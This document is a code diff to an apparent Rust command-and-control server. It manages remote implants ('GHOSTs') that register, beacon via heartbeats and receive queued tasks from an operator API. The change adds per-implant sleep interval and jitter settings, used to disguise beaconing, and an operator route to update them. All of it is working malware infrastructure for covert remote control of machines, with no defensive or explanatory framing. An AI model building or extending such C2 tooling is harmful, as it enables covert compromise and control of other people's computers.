@@ -32,7 +32,16 @@ pub struct Ghost {
     pub id: String,         // UUID v7
     pub hostname: String,   // system hostname of machine on which the implant resides
     pub os: String,         // operating system, for now we'll just send correct implant, TODO to automatically detect OS and send correct implant
-    pub last_seen: i64      // unix timestamp
+    pub sleep_interval: Option<i64>,
+    pub jitter_percent: Option<i8>,
+    pub update_pending: Option<bool>,
+    pub last_seen: Option<i64>      // unix timestamp
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct GhostConfig {
+    pub sleep_interval: i64,
+    pub jitter_percent: i8
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -60,7 +69,7 @@ pub struct TaskResult {
 #[derive(Serialize, Deserialize)]
 pub struct HeartbeatResponse {
     pub sleep_interval: i64,
-    pub jitter: i64,
+    pub jitter: i8,
     pub tasks: Option<Vec<TaskDefinition>>
 }
 
@@ -90,9 +99,9 @@ async fn handle_ghost_register(
     State(state): State<Arc<ServerState>>,
     Json(mut ghost): Json<Ghost>
 ) -> Json<String> {
-    println!("GHOST registered: {} ({})", ghost.hostname, ghost.id);
+    println!("GHOST registered: {} {} ({})", ghost.os, ghost.hostname, ghost.id);
 
-    ghost.last_seen = chrono::Utc::now().timestamp();
+    ghost.last_seen = Some(chrono::Utc::now().timestamp());
     state.ghosts.insert(ghost.id.clone(), ghost);
 
     Json("ACK".to_string())
@@ -102,8 +111,19 @@ async fn handle_ghost_heartbeat(
     State(state): State<Arc<ServerState>>,
     Json(req): Json<HeartbeatRequest>
 ) -> Json<HeartbeatResponse> {
+    let mut current_sleep = -1;
+    let mut current_jitter = -1;
+
     if let Some(mut ghost) = state.ghosts.get_mut(&req.id) {
-        ghost.last_seen = chrono::Utc::now().timestamp();
+        ghost.last_seen = Some(chrono::Utc::now().timestamp());
+
+        current_sleep = ghost.sleep_interval.unwrap_or(5);
+        current_jitter = ghost.jitter_percent.unwrap_or(1);
+
+        if ghost.update_pending == Some(true) {
+            println!("GHOST {} config updated", req.id);
+            ghost.update_pending = Some(false);
+        }
     } else {
         println!("ERROR unknown GHOST {} sent heartbeat", req.id);
     }
@@ -140,8 +160,8 @@ async fn handle_ghost_heartbeat(
     }
 
     let response = HeartbeatResponse {
-        sleep_interval: 5,
-        jitter: 1,
+        sleep_interval: current_sleep,
+        jitter: current_jitter,
         tasks: if outgoing_tasks.is_empty() { None } else { Some(outgoing_tasks) }
     };
 
@@ -168,6 +188,22 @@ async fn handle_charon_get_ghost(
 ) -> Json<Option<Ghost>> {
     let ghost = state.ghosts.get(&id).map(|e| e.value().clone());
     Json(ghost)
+}
+
+async fn handle_charon_update_ghost(
+    Path(id): Path<String>,
+    State(state): State<Arc<ServerState>>,
+    Json(req): Json<GhostConfig>
+) -> Json<String> {
+    if let Some(mut ghost) = state.ghosts.get_mut(&id) {
+        ghost.sleep_interval = Some(req.sleep_interval);
+        ghost.jitter_percent = Some(req.jitter_percent);
+        ghost.update_pending = Some(true);
+    } else {
+        println!("ERROR update for unknown GHOST with {}", id);
+    }
+
+    Json("OK".to_string())
 }
 
 async fn handle_charon_get_ghost_tasks(
@@ -250,7 +286,7 @@ pub fn app(state: Arc<ServerState>) -> Router {
 
     let charon_routes = Router::<Arc<ServerState>>::new()
         .route("/ghosts", get(handle_charon_list_ghosts))           // list active GHOSTs
-        .route("/ghosts/{id}", get(handle_charon_get_ghost))         // get details about a GHOST
+        .route("/ghosts/{id}", get(handle_charon_get_ghost).post(handle_charon_update_ghost))         // get details about a GHOST or update its config
         .route("/ghosts/{id}/task", post(handle_charon_queue_task))  // assign a task to GHOST
         .route("/ghosts/{id}/tasks", get(handle_charon_get_ghost_tasks))    // get all tasks for GHOST
         .route("/tasks/{id}", get(handle_charon_get_task_details))    // get single task details
